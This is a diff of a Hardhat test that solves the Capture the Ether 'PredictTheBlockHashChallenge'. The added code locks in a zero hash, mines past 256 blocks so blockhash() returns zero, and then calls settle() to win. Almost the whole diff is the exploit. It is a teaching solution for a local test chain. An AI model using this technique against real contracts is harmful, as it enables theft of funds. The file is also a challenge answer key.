@@ -2,7 +2,7 @@ import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
-const { utils } = ethers;
+const { utils, provider } = ethers;
 
 describe('PredictTheBlockHashChallenge', () => {
   let deployer: SignerWithAddress;
@@ -24,9 +24,24 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    let blockHash = "0x0000000000000000000000000000000000000000000000000000000000000000";
+    await target.lockInGuess(blockHash, { value: utils.parseEther('1') });
+
+    const initBlockNumber = await ethers.provider.getBlockNumber();
+
+  let lastBlockNumber = initBlockNumber;
+  do {
+    try {
+      lastBlockNumber = await ethers.provider.getBlockNumber();
+      console.log(`Block number: ${lastBlockNumber}`);
+      await provider.send("evm_mine", []);
+    } catch (err) {
+      console.log(err);
+    }
+  } while (lastBlockNumber - initBlockNumber < 256);
+
+  const attackTx = await target.settle();
+  await attackTx.wait();
 
     expect(await target.isComplete()).to.equal(true);
   });
